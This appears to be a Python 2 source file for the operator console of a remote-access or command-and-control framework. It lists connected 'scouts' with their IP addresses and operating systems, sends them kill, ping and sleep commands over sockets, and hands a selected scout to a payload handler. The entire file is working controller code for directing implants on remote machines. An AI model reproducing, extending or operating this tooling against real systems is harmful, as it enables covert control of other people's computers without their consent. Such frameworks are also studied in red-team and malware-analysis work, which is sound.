import socket
import time
import os
import modules.cfg as cfg
import modules.show_banner as show_banner
import modules.clear_screen as clear_screen
import modules.cleanup_and_exit as cleanup_and_exit
import modules.execute_local_command as execute_local_command
import handlers.generic_handler as generic_handler

cfg.global_variables()


def scout_console():
    while True:
        try:
            command_input = raw_input(cfg.prompt_scouts).strip()
            option = command_input.split(' ',1)[0]
            if option == 'banner':
                show_banner.banner()
            elif option == 'clear':
                clear_screen.clear()
            elif option == 'help':
                print cfg.scout_help_menu
            elif option == 'local':
                try:
                    execute_local_command.execute(command_input.split(' ',1)[1])
                except IndexError:
                    print cfg.err + 'Specify a local system command to execute'
            elif option == 'python':
                try:
                    print cfg.note + 'Switching to python interpreter, exit() to exit\n'
                    os.system('python')
                except KeyboardInterrupt:
                    pass
            elif option == 'quit':
                cleanup_and_exit.cleanup()
            elif option == 'back':
                print cfg.pos + 'Returning...'
                return
            elif option == 'bridge':
                found_target = False
                try:
                    tar_id = command_input.split(' ',1)[1]
                except IndexError:
                    print cfg.err + 'Provide a scout ID'
                    continue
                for i in range(len(cfg.db_scouts)):
                    if str(cfg.db_scouts[i][0]) == tar_id:
                        found_target = True
                        tar_id = i
                        break
                if found_target:
                    generic_handler.payload_handler(tar_id)
                else:
                    print cfg.err + 'Invalid scout ID'
            elif option == 'kill':
                try:
                    killed_scout = False
                    if command_input.split(' ',1)[1] == 'all':
                        if cfg.db_scouts:
                            for i in cfg.db_scouts:
                                i[5].sendall('terminate' + cfg.End)
                            cfg.db_scouts = []
                            print cfg.pos + 'Terminated all scouts'
                        else:
                            print cfg.err + 'No connected scouts'
                        continue
                    for i in cfg.db_scouts:
                        if str(i[0]) == command_input.split(' ',1)[1]:
                            i[5].sendall('terminate' + cfg.End)
                            cfg.db_scouts.pop(cfg.db_scouts.index(i))
                            print cfg.pos + 'Terminated scout : ' + str(i[0])
                            killed_scout = True
                            break
                    if not killed_scout:
                        print cfg.err + 'Could not kill scout of ID : ' + command_input.split(' ',1)[1]
                except IndexError:
                    print cfg.err + 'Invalid ID'
                except (socket.error,socket.timeout):
                    print cfg.err + 'Scout seems to be dead, removing from database'
                    for i in cfg.db_scouts:
                        if str(i[0]) == command_input.split(' ',1)[1]:
                            cfg.db_scouts.pop(cfg.db_scouts.index(i))
                            break
            elif option == 'ping':
                try:
                    found_target = False
                    try:
                        if command_input.split(' ',1)[1] == 'all':
                            if cfg.db_scouts:
                                for i in range(len(cfg.db_scouts)):
                                    try:
                                        cfg.db_scouts[i][5].sendall('ping' + cfg.End)
                                        cfg.db_scouts[i][5].settimeout(6)
                                        print cfg.note + 'Scout : ' + str(cfg.db_scouts[i][0]) + '\n' + cfg.db_scouts[i][5].recv(99999)[:-len(cfg.End)].replace('[+]', cfg.pos, 1) + '\n'
                                        cfg.db_scouts[i][5].settimeout(None)
                                    except (socket.timeout, socket.error):
                                        print cfg.note + 'Scout : ' + str(cfg.db_scouts[i][0]) + '\n' + cfg.err + 'Scout is dead, no reply reveived\n'
                                continue
                        for i in range(len(cfg.db_scouts)):
                            if str(cfg.db_scouts[i][0]) == command_input.split(' ',1)[1]:
                                found_target = True
                                tar_id = i
                                break
                        if found_target:
                            cfg.db_scouts[tar_id][5].sendall('ping' + cfg.End)
                            cfg.db_scouts[tar_id][5].settimeout(6)
                            print cfg.db_scouts[tar_id][5].recv(99999)[:-len(cfg.End)].replace('[+]', cfg.pos, 1)
                            cfg.db_scouts[tar_id][5].settimeout(None)
                        else:
                            print cfg.err + 'Invalid Scout ID'
                    except IndexError:
                        print cfg.err + 'Invalid Scout ID'
                        continue
                except (socket.error, socket.timeout):
                    print cfg.err + 'Scout is dead, no reply received'
            elif option == 'show':
                print '\n' + cfg.note + 'Currently active scouts :\n'
                if cfg.db_scouts:
                    scout_data = [['ID','IP address','Identifying Name','Type','Operating System'],['==','==========','================','====','================']]
                    for i in cfg.db_scouts:
                        scout_data.append([str(i[0]),str(i[1]),str(i[2]),str(i[3]),str(i[4])])
                    l = [len(max(i, key=len)) for i in zip(*scout_data)]
                    print('\n'.join('     '.join(item[i].ljust(l[i]) for i in range(len(l)))
                                    for item in scout_data))
                    print '\n'
            elif option == 'sleep':
                try:
                    slept_scout = False
                    who_to_sleep = command_input.split(' ')[1]
                    how_long_to_sleep = command_input.split(' ')[2]
                    try:
                        int(how_long_to_sleep)
                    except:
                        print cfg.err + 'Invalid sleep value'
                        continue
                except IndexError:
                    print cfg.err + 'Invalid command syntax/command arguments'
                    continue
                if who_to_sleep == 'all':
                    if cfg.db_scouts:
                        for i in cfg.db_scouts:
                            try:
                                i[5].sendall('sleep ' + how_long_to_sleep + cfg.End)
                            except (socket.error,socket.timeout):
                                print cfg.err + 'Scout : ' + str(i[0])  + ' appears to be dead, removing from database'
                                cfg.db_scouts.pop(cfg.db_scouts.index(i))
                        cfg.db_scouts = []
                        print cfg.pos + 'Slept all scouts'
                    else:
                        print cfg.err + 'No connected scouts'
                else:
                    if cfg.db_scouts:
                        for i in cfg.db_scouts:
                            if str(i[0]) == who_to_sleep:
                                try:
                                    i[5].sendall('sleep ' + how_long_to_sleep + cfg.End)
                                    cfg.db_scouts.pop(cfg.db_scouts.index(i))
                                    print cfg.pos + 'Slept scout of ID : ' + who_to_sleep
                                    slept_scout = True
                                    break
                                except (socket.error, socket.timeout):
                                    slept_scout = True
                                    print cfg.err + 'Scout : ' + str(i[0]) + ' appears to be dead, removing from database'
                                    cfg.db_scouts.pop(cfg.db_scouts.index(i))
                        if not slept_scout:
                            print cfg.err + 'Invalid scout ID'
                    else:
                        print cfg.err + 'No connected scouts'
            elif option == '':
                pass
            else:
                print cfg.err + 'Unknown command "' + command_input + '", run "help" for help menu'
        except EOFError:
            time.sleep(2)
        except Exception as e:
            print cfg.err + 'Error : ' + str(e)
